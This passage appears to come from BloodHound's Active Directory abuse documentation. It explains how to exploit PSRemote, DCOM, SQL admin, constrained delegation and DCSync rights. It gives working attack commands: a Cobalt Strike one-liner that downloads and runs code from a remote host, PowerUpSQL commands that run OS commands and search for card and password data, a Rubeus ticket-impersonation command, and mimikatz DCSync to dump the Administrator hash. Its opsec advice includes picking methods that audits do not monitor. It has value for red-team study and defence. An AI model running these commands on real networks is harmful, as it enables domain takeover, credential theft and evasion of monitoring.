<p>Cleanup of the session is done with the Disconnect-PSSession and Remove-PSSession commands.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Disconnect-PSSession -Session $session
Remove-PSSession -Session $session
</pre></div>
</div>
<p>An example of running through this Cobalt Strike for lateral movement is as follows:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>powershell $session =  New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session
-ScriptBlock {IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.231.99:80/a&#39;))};
Disconnect-PSSession -Session $session; Remove-PSSession -Session $session
</pre></div>
</div>
</section>
<section id="id23">
<h3>Opsec Considerations<a class="headerlink" href="#id23" title="Link to this heading"></a></h3>
<p>When using the PowerShell functions, keep in mind that PowerShell v5 introduced several security
mechanisms that make it much easier for defenders to see what’s going on with PowerShell in their
network, such as script block logging and AMSI.</p>
<p>Entering a PSSession will generate a logon event on the target computer.</p>
</section>
<section id="id24">
<h3>References<a class="headerlink" href="#id24" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7</a></p></li>
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="executedcom">
<h2>ExecuteDCOM<a class="headerlink" href="#executedcom" title="Link to this heading"></a></h2>
<p>This can allow code execution under certain conditions by instantiating a COM object on a remote
machine and invoking its methods.</p>
<section id="id25">
<h3>Abuse Info<a class="headerlink" href="#id25" title="Link to this heading"></a></h3>
<p>The PowerShell script Invoke-DCOM implements lateral movement using a variety of different COM
objects (ProgIds: MMC20.Application, ShellWindows, ShellBrowserWindow, ShellBrowserWindow, and
ExcelDDE).  LethalHTA implements lateral movement using the HTA COM object (ProgId: htafile).</p>
<p>One can manually instantiate and manipulate COM objects on a remote machine using the following
PowerShell code.  If specifying a COM object by its CLSID:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ComputerName = &lt;target computer name&gt;              # Remote computer
$clsid = &quot;{fbae34e8-bf95-4da8-bf98-6c6e580aa348}&quot;   # GUID of the COM object
$Type = [Type]::GetTypeFromCLSID($clsid, $ComputerName)
$ComObject = [Activator]::CreateInstance($Type)
</pre></div>
</div>
<p>If specifying a COM object by its ProgID:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ComputerName = &lt;target computer name&gt;              # Remote computer
$ProgId = &quot;&lt;NAME&gt;&quot;                                  # GUID of the COM object
$Type = [Type]::GetTypeFromProgID($ProgId, $ComputerName)
$ComObject = [Activator]::CreateInstance($Type)
</pre></div>
</div>
</section>
<section id="id26">
<h3>Opsec Considerations<a class="headerlink" href="#id26" title="Link to this heading"></a></h3>
<p>The artifacts generated when using DCOM vary depending on the specific COM object used.</p>
<p>DCOM is built on top of the TCP/IP RPC protocol (TCP ports 135 + high ephemeral ports) and may
leverage several different RPC interface UUIDs(outlined here). In order to use DCOM, one must
be authenticated.  Consequently, logon events and authentication-specific logs(Kerberos, NTLM,
etc.) will be generated when using DCOM.</p>
<p>Processes may be spawned as the user authenticating to the remote system, as a user already
logged into the system, or may take advantage of an already spawned process.</p>
<p>Many DCOM servers spawn under the process “svchost.exe -k DcomLaunch” and typically have a
command line containing the string “ -Embedding” or are executing inside of the DLL hosting
process “DllHost.exe /Processid:{&lt;AppId&gt;}” (where AppId is the AppId the COM object is
registered to use).  Certain COM services are implemented as service executables; consequently,
service-related event logs may be generated.</p>
</section>
<section id="id27">
<h3>References<a class="headerlink" href="#id27" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/">https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/</a></p></li>
<li><p><a class="reference external" href="https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/">https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/</a></p></li>
<li><p><a class="reference external" href="https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/">https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/</a></p></li>
<li><p><a class="reference external" href="https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/">https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/</a></p></li>
<li><p><a class="reference external" href="https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom">https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom</a></p></li>
<li><p><a class="reference external" href="https://www.cybereason.com/blog/dcom-lateral-movement-techniques">https://www.cybereason.com/blog/dcom-lateral-movement-techniques</a></p></li>
<li><p><a class="reference external" href="https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/">https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/</a></p></li>
<li><p><a class="reference external" href="https://attack.mitre.org/wiki/Technique/T1175">https://attack.mitre.org/wiki/Technique/T1175</a></p></li>
</ul>
<p><strong>Invoke-DCOM</strong></p>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1">https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1</a></p></li>
</ul>
<p><strong>LethalHTA</strong></p>
<ul class="simple">
<li><p><a class="reference external" href="https://codewhitesec.blogspot.com/2018/07/lethalhta.html">https://codewhitesec.blogspot.com/2018/07/lethalhta.html</a></p></li>
<li><p><a class="reference external" href="https://github.com/codewhitesec/LethalHTA/">https://github.com/codewhitesec/LethalHTA/</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="sqladmin">
<h2>SQLAdmin<a class="headerlink" href="#sqladmin" title="Link to this heading"></a></h2>
<p>The user is a SQL admin on the target computer</p>
<p>There is at least one MSSQL instance running on the computer where the user with the inbound
SQLAdmin edge is the account configured to run the SQL Server instance. The typical configuration
for MSSQL is to have the local Windows account or Active Directory domain account that is
configured to run the SQL Server service (the primary database engine for SQL Server) have
sysadmin privileges in the SQL Server application. As a result, the SQL Server service account
can be used to log into the SQL Server instance remotely, read all of the databases (including
those protected with transparent encryption), and run operating systems command through SQL
Server (as the service account) using a variety of techniques.</p>
<p>For Windows systems that have been joined to an Active Directory domain, the SQL Server instances
and the associated service account can be identified by executing a LDAP query for a list of
“MSSQLSvc” Service Principal Names (SPN) as a domain user. In short, when the Database Engine
service starts, it attempts to register the SPN, and the SPN is then used to help facilitate
Kerberos authentication.</p>
<p>Author: Scott Sutherland</p>
<p>This clip demonstrates how to abuse this edge:</p>
<div style="text-align: center; margin-bottom: 2em;">
<iframe width="100%" height="350" src="https://www.youtube.com/embed/fqYoOoghqdE?t=2141?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div><section id="id28">
<h3>Abuse Info<a class="headerlink" href="#id28" title="Link to this heading"></a></h3>
<p>Scott Sutherland from NetSPI has authored PowerUpSQL, a PowerShell Toolkit for Attacking SQL
Server. Major contributors include Antti Rantasaari, Eric Gruber, and Thomas Elling. Before
executing any of the below commands, download PowerUpSQL and load it into your PowerShell
instance. Get PowerUpSQL here: <a class="reference external" href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a></p>
<p><strong>Finding Data</strong></p>
<p>Get a list of databases, sizes, and encryption status:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Get-SQLDatabaseThreaded –Verbose -Instance sqlserver\instance –Threads 10 -NoDefaults
</pre></div>
</div>
<p>Search columns and data for keywords:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Get-SQLColumnSampleDataThreaded –Verbose -Instance sqlserver\instance –Threads 10 –Keyword &quot;card, password&quot; –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSize
</pre></div>
</div>
<p><strong>Executing Commands</strong></p>
<p>Below are examples of PowerUpSQL functions that can be used to execute operating system
commands on remote systems through SQL Server using different techniques.  The level of
access on the operating system will depend largely what privileges are provided to the
service account.  However, when domain accounts are configured to run SQL Server services,
it is very common to see them configured with local administrator privileges.</p>
<p>xp_cmdshell Execute Example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">SQLOSCmd</span> <span class="o">-</span><span class="n">Verbose</span> <span class="o">-</span><span class="n">Command</span> <span class="s2">&quot;Whoami&quot;</span> <span class="o">-</span><span class="n">Threads</span> <span class="mi">10</span> <span class="o">-</span><span class="n">Instance</span> <span class="n">sqlserver</span>\<span class="n">instance</span>
</pre></div>
</div>
<p>Agent Job Execution Examples:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">SQLOSCmdAgentJob</span> <span class="o">-</span><span class="n">Verbose</span> <span class="o">-</span><span class="n">SubSystem</span> <span class="n">CmdExec</span> <span class="o">-</span><span class="n">Command</span> <span class="s2">&quot;echo hello &gt; c:\windows</span><span class="se">\t</span><span class="s2">emp</span><span class="se">\t</span><span class="s2">est1.txt&quot;</span> <span class="o">-</span><span class="n">Instance</span> <span class="n">sqlserver</span>\<span class="n">instance</span> <span class="o">-</span><span class="n">username</span> <span class="n">myuser</span> <span class="o">-</span><span class="n">password</span> <span class="n">mypassword</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">SQLOSCmdAgentJob</span> <span class="o">-</span><span class="n">Verbose</span> <span class="o">-</span><span class="n">SubSystem</span> <span class="n">PowerShell</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;write-output &quot;hello world&quot; | out-file c:\windows</span><span class="se">\t</span><span class="s1">emp</span><span class="se">\t</span><span class="s1">est2.txt&#39;</span> <span class="o">-</span><span class="n">Sleep</span> <span class="mi">20</span> <span class="o">-</span><span class="n">Instance</span> <span class="n">sqlserver</span>\<span class="n">instance</span> <span class="o">-</span><span class="n">username</span> <span class="n">myuser</span> <span class="o">-</span><span class="n">password</span> <span class="n">mypassword</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">SQLOSCmdAgentJob</span> <span class="o">-</span><span class="n">Verbose</span> <span class="o">-</span><span class="n">SubSystem</span> <span class="n">VBScript</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;c:\windows\system32\cmd.exe /c echo hello &gt; c:\windows</span><span class="se">\t</span><span class="s1">emp</span><span class="se">\t</span><span class="s1">est3.txt&#39;</span> <span class="o">-</span><span class="n">Instance</span> <span class="n">sqlserver</span>\<span class="n">instance</span> <span class="o">-</span><span class="n">username</span> <span class="n">myuser</span> <span class="o">-</span><span class="n">password</span> <span class="n">mypassword</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">SQLOSCmdAgentJob</span> <span class="o">-</span><span class="n">Verbose</span> <span class="o">-</span><span class="n">SubSystem</span> <span class="n">JScript</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;c:\windows\system32\cmd.exe /c echo hello &gt; c:\windows</span><span class="se">\t</span><span class="s1">emp</span><span class="se">\t</span><span class="s1">est3.txt&#39;</span> <span class="o">-</span><span class="n">Instance</span> <span class="n">sqlserver</span>\<span class="n">instance</span> <span class="o">-</span><span class="n">username</span> <span class="n">myuser</span> <span class="o">-</span><span class="n">password</span> <span class="n">mypassword</span>
</pre></div>
</div>
<p>Python Subsystem Execution:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">SQLOSPython</span> <span class="o">-</span><span class="n">Verbose</span> <span class="o">-</span><span class="n">Command</span> <span class="s2">&quot;Whoami&quot;</span> <span class="o">-</span><span class="n">Instance</span> <span class="n">sqlserver</span>\<span class="n">instance</span>
</pre></div>
</div>
<p>R subsystem Execution Example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">SQLOSR</span> <span class="o">-</span><span class="n">Verbose</span> <span class="o">-</span><span class="n">Command</span> <span class="s2">&quot;Whoami&quot;</span> <span class="o">-</span><span class="n">Instance</span> <span class="n">sqlserver</span>\<span class="n">instance</span>
</pre></div>
</div>
<p>OLE Execution Example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">SQLOSOle</span> <span class="o">-</span><span class="n">Verbose</span> <span class="o">-</span><span class="n">Command</span> <span class="s2">&quot;Whoami&quot;</span> <span class="o">-</span><span class="n">Instance</span> <span class="n">sqlserver</span>\<span class="n">instance</span>
</pre></div>
</div>
<p>CLR Execution Example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">SQLOSCLR</span> <span class="o">-</span><span class="n">Verbose</span> <span class="o">-</span><span class="n">Command</span> <span class="s2">&quot;Whoami&quot;</span> <span class="o">-</span><span class="n">Instance</span> <span class="n">sqlserver</span>\<span class="n">instance</span>
</pre></div>
</div>
<p>Custom Extended Procedure Execution Example:</p>
<ol class="arabic simple">
<li><p>Create a custom extended stored procedure:</p></li>
</ol>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Create</span><span class="o">-</span><span class="n">SQLFileXpDll</span> <span class="o">-</span><span class="n">Verbose</span> <span class="o">-</span><span class="n">OutFile</span> <span class="n">c</span><span class="p">:</span>\<span class="n">temp</span>\<span class="n">test</span><span class="o">.</span><span class="n">dll</span> <span class="o">-</span><span class="n">Command</span> <span class="s2">&quot;echo test &gt; c:</span><span class="se">\t</span><span class="s2">emp</span><span class="se">\t</span><span class="s2">est.txt&quot;</span> <span class="o">-</span><span class="n">ExportName</span> <span class="n">xp_test</span>
</pre></div>
</div>
<ol class="arabic simple" start="2">
<li><p>Host the test.dll on a share readable by the SQL Server service account:</p></li>
</ol>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">SQLQuery</span> <span class="o">-</span><span class="n">Verbose</span> <span class="o">-</span><span class="n">Query</span> <span class="s2">&quot;sp_addextendedproc &#39;xp_test&#39;, &#39;</span><span class="se">\\</span><span class="s2">yourserver\yourshare\myxp.dll&#39;&quot;</span> <span class="o">-</span><span class="n">Instance</span> <span class="n">sqlserver</span>\<span class="n">instance</span>
</pre></div>
</div>
<ol class="arabic simple" start="3">
<li><p>Run extended stored procedure:</p></li>
</ol>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">SQLQuery</span> <span class="o">-</span><span class="n">Verbose</span> <span class="o">-</span><span class="n">Query</span> <span class="s2">&quot;xp_test&quot;</span> <span class="o">-</span><span class="n">Instance</span> <span class="n">sqlserver</span>\<span class="n">instance</span>
</pre></div>
</div>
<ol class="arabic simple" start="4">
<li><p>Remove extended stored procedure:</p></li>
</ol>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">SQLQuery</span> <span class="o">-</span><span class="n">Verbose</span> <span class="o">-</span><span class="n">Query</span> <span class="s2">&quot;sp_dropextendedproc &#39;xp_test&#39;&quot;</span> <span class="o">-</span><span class="n">Instance</span> <span class="n">sqlserver</span>\<span class="n">instance</span>
</pre></div>
</div>
<p>Author: Scott Sutherland</p>
</section>
<section id="id29">
<h3>Opsec Considerations<a class="headerlink" href="#id29" title="Link to this heading"></a></h3>
<p>Prior to executing operating system commands through SQL Server, review the audit configuration
and choose a command execution method that is not being monitored.</p>
<p>View audits:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SELECT</span> <span class="o">*</span> <span class="n">FROM</span> <span class="n">sys</span><span class="o">.</span><span class="n">dm_server_audit_status</span>
</pre></div>
</div>
<p>View server specifications:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SELECT</span> <span class="n">audit_id</span><span class="p">,</span>
<span class="n">a</span><span class="o">.</span><span class="n">name</span> <span class="k">as</span> <span class="n">audit_name</span><span class="p">,</span>
<span class="n">s</span><span class="o">.</span><span class="n">name</span> <span class="k">as</span> <span class="n">server_specification_name</span><span class="p">,</span>
<span class="n">d</span><span class="o">.</span><span class="n">audit_action_name</span><span class="p">,</span>
<span class="n">s</span><span class="o">.</span><span class="n">is_state_enabled</span><span class="p">,</span>
<span class="n">d</span><span class="o">.</span><span class="n">is_group</span><span class="p">,</span>
<span class="n">d</span><span class="o">.</span><span class="n">audit_action_id</span><span class="p">,</span>
<span class="n">s</span><span class="o">.</span><span class="n">create_date</span><span class="p">,</span>
<span class="n">s</span><span class="o">.</span><span class="n">modify_date</span>
<span class="n">FROM</span> <span class="n">sys</span><span class="o">.</span><span class="n">server_audits</span> <span class="n">AS</span> <span class="n">a</span>
<span class="n">JOIN</span> <span class="n">sys</span><span class="o">.</span><span class="n">server_audit_specifications</span> <span class="n">AS</span> <span class="n">s</span>
<span class="n">ON</span> <span class="n">a</span><span class="o">.</span><span class="n">audit_guid</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">audit_guid</span>
<span class="n">JOIN</span> <span class="n">sys</span><span class="o">.</span><span class="n">server_audit_specification_details</span> <span class="n">AS</span> <span class="n">d</span>
<span class="n">ON</span> <span class="n">s</span><span class="o">.</span><span class="n">server_specification_id</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">server_specification_id</span>
</pre></div>
</div>
<p>View database specifications:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SELECT</span> <span class="n">a</span><span class="o">.</span><span class="n">audit_id</span><span class="p">,</span>
<span class="n">a</span><span class="o">.</span><span class="n">name</span> <span class="k">as</span> <span class="n">audit_name</span><span class="p">,</span>
<span class="n">s</span><span class="o">.</span><span class="n">name</span> <span class="k">as</span> <span class="n">database_specification_name</span><span class="p">,</span>
<span class="n">d</span><span class="o">.</span><span class="n">audit_action_name</span><span class="p">,</span>
<span class="n">d</span><span class="o">.</span><span class="n">major_id</span><span class="p">,</span>
<span class="n">OBJECT_NAME</span><span class="p">(</span><span class="n">d</span><span class="o">.</span><span class="n">major_id</span><span class="p">)</span> <span class="k">as</span> <span class="nb">object</span><span class="p">,</span>
<span class="n">s</span><span class="o">.</span><span class="n">is_state_enabled</span><span class="p">,</span>
<span class="n">d</span><span class="o">.</span><span class="n">is_group</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">create_date</span><span class="p">,</span>
<span class="n">s</span><span class="o">.</span><span class="n">modify_date</span><span class="p">,</span>
<span class="n">d</span><span class="o">.</span><span class="n">audited_result</span>
<span class="n">FROM</span> <span class="n">sys</span><span class="o">.</span><span class="n">server_audits</span> <span class="n">AS</span> <span class="n">a</span>
<span class="n">JOIN</span> <span class="n">sys</span><span class="o">.</span><span class="n">database_audit_specifications</span> <span class="n">AS</span> <span class="n">s</span>
<span class="n">ON</span> <span class="n">a</span><span class="o">.</span><span class="n">audit_guid</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">audit_guid</span>
<span class="n">JOIN</span> <span class="n">sys</span><span class="o">.</span><span class="n">database_audit_specification_details</span> <span class="n">AS</span> <span class="n">d</span>
<span class="n">ON</span> <span class="n">s</span><span class="o">.</span><span class="n">database_specification_id</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">database_specification_id</span>
</pre></div>
</div>
<p>If server audit specifications are configured on the SQL Server, event ID 15457 logs may be
created in the Windows Application log when SQL Server level configurations are changed to
facilitate OS command execution.</p>
<p>If database audit specifications are configured on the SQL Server, event ID 33205 logs may
be created in the Windows Application log when Agent and database level configuration changes
are made.</p>
<p>A summary of the what will show up in the logs, along with the TSQL queries for viewing and
configuring audit configurations can be found at <a class="reference external" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Audit%20Command%20Execution%20Template.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Audit%20Command%20Execution%20Template.sql</a></p>
<p>Author: Scott Sutherland</p>
</section>
<section id="id30">
<h3>References<a class="headerlink" href="#id30" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/NetSPI/PowerUpSQL/wiki">https://github.com/NetSPI/PowerUpSQL/wiki</a></p></li>
<li><p><a class="reference external" href="https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation">https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation</a></p></li>
<li><p><a class="reference external" href="https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver">https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver</a></p></li>
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017">https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017</a></p></li>
<li><p><a class="reference external" href="https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/">https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="allowedtodelegate">
<h2>AllowedToDelegate<a class="headerlink" href="#allowedtodelegate" title="Link to this heading"></a></h2>
<p>The constrained delegation primitive allows a principal to authenticate as any user to specific
services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the
target computer. That is, a node with this privilege can impersonate any domain principal
(including Domain Admins) to the specific service on the target host. One caveat- impersonated
users can not be in the “Protected Users” security group or otherwise have delegation privileges
revoked.</p>
<p>An issue exists in the constrained delegation where the service name (sname) of the resulting
ticket is not a part of the protected ticket information, meaning that an attacker can modify
the target service name to any service of their choice. For example, if msds-AllowedToDelegateTo
is “HTTP/host.domain.com”, tickets can be modified for LDAP/HOST/etc. service names, resulting
in complete server compromise, regardless of the specific service listed.</p>
<section id="id31">
<h3>Abuse Info<a class="headerlink" href="#id31" title="Link to this heading"></a></h3>
<p>Abusing this privilege can utilize Benjamin Delpy’s Kekeo project, proxying in traffic generated
from the Impacket library, or using the Rubeus project’s s4u abuse.</p>
<p>In the following example, <em>victim</em> is the attacker-controlled account (i.e. the hash is known)
that is configured for constrained delegation. That is, <em>victim</em> has the “HTTP/PRIMARY.testlab.local”
service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests
a TGT for the <em>victim</em> user and executes the S4U2self/S4U2proxy process to impersonate the “admin”
user to the “HTTP/PRIMARY.testlab.local” SPN. The alternative sname “cifs” is substituted in to the
final service ticket and the ticket is submitted to the current logon session. This grants the attacker
the ability to access the file system of PRIMARY.testlab.local as the “admin” user.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">victim</span> <span class="o">/</span><span class="n">rc4</span><span class="p">:</span><span class="mi">2</span><span class="n">b576acbe6bcfda7294d6bd18041b8fe</span> <span class="o">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">admin</span> <span class="o">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="s2">&quot;HTTP/PRIMARY.testlab.local&quot;</span> <span class="o">/</span><span class="n">altservice</span><span class="p">:</span><span class="n">cifs</span> <span class="o">/</span><span class="n">ptt</span>
</pre></div>
</div>
</section>
<section id="id32">
<h3>Opsec Considerations<a class="headerlink" href="#id32" title="Link to this heading"></a></h3>
<p>As mentioned in the abuse info, in order to currently abuse this primitive the Rubeus C# assembly needs
to be executed on some system with the ability to send/receive traffic in the domain. See the References
for more information.</p>
</section>
<section id="id33">
<h3>References<a class="headerlink" href="#id33" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a></p></li>
<li><p><a class="reference external" href="https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/">https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/</a></p></li>
<li><p><a class="reference external" href="https://blog.harmj0y.net/activedirectory/s4u2pwnage/">https://blog.harmj0y.net/activedirectory/s4u2pwnage/</a></p></li>
<li><p><a class="reference external" href="https://twitter.com/gentilkiwi/status/806643377278173185">https://twitter.com/gentilkiwi/status/806643377278173185</a></p></li>
<li><p><a class="reference external" href="https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more">https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more</a></p></li>
<li><p><a class="reference external" href="https://blog.harmj0y.net/redteaming/from-kekeo-to-rubeus/">https://blog.harmj0y.net/redteaming/from-kekeo-to-rubeus/</a></p></li>
<li><p><a class="reference external" href="https://blog.harmj0y.net/redteaming/another-word-on-delegation/">https://blog.harmj0y.net/redteaming/another-word-on-delegation/</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="dcsync">
<h2>DCSync<a class="headerlink" href="#dcsync" title="Link to this heading"></a></h2>
<p>This edge represents the combination of GetChanges and GetChangesAll. The combination of both these privileges grants a principal the ability to perform the DCSync attack.</p>
<section id="id34">
<h3>Abuse Info<a class="headerlink" href="#id34" title="Link to this heading"></a></h3>
<p>With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to
get the password hash of an arbitrary principal using mimikatz:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="n">testlab</span><span class="o">.</span><span class="n">local</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span>
</pre></div>
</div>
<p>You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on
this see the blog post by harmj0y in the references tab.</p>
</section>
<section id="id35">
<h3>Opsec Considerations<a class="headerlink" href="#id35" title="Link to this heading"></a></h3>
<p>For detailed information on detection of DCSync as well as opsec considerations, see the ADSecurity
post in the references section below.</p>
</section>
<section id="id36">
<h3>References<a class="headerlink" href="#id36" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://adsecurity.org/?p=1729">https://adsecurity.org/?p=1729</a></p></li>
<li><p><a class="reference external" href="https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/">https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="getchanges-getchangesall">
<h2>GetChanges/GetChangesAll<a class="headerlink" href="#getchanges-getchangesall" title="Link to this heading"></a></h2>
<p>The combination of both these privileges grants a principal the ability to perform the DCSync attack.</p>
<section id="id37">
<h3>Abuse Info<a class="headerlink" href="#id37" title="Link to this heading"></a></h3>
<p>With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to
get the password hash of an arbitrary principal using mimikatz:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="n">testlab</span><span class="o">.</span><span class="n">local</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span>
</pre></div>
</div>
<p>You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on
this see the blog post by harmj0y in the references tab.</p>
</section>
<section id="id38">
<h3>Opsec Considerations<a class="headerlink" href="#id38" title="Link to this heading"></a></h3>
<p>For detailed information on detection of DCSync as well as opsec considerations, see the ADSecurity
post in the references section below.</p>
</section>
<section id="id39">
<h3>References<a class="headerlink" href="#id39" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p><a class="reference external" href="https://adsecurity.org/?p=1729">https://adsecurity.org/?p=1729</a></p></li>
<li><p><a class="reference external" href="https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/">https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/</a></p></li>
</ul>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
</section>
</section>
<section id="genericall">
<h2>GenericAll<a class="headerlink" href="#genericall" title="Link to this heading"></a></h2>
<p>This is also known as full control. This privilege allows the trustee to manipulate the target object
however they wish.</p>
<section id="id40">
<h3>Abuse Info<a class="headerlink" href="#id40" title="Link to this heading"></a></h3>
<p><strong>With GenericAll Over a Group:</strong></p>
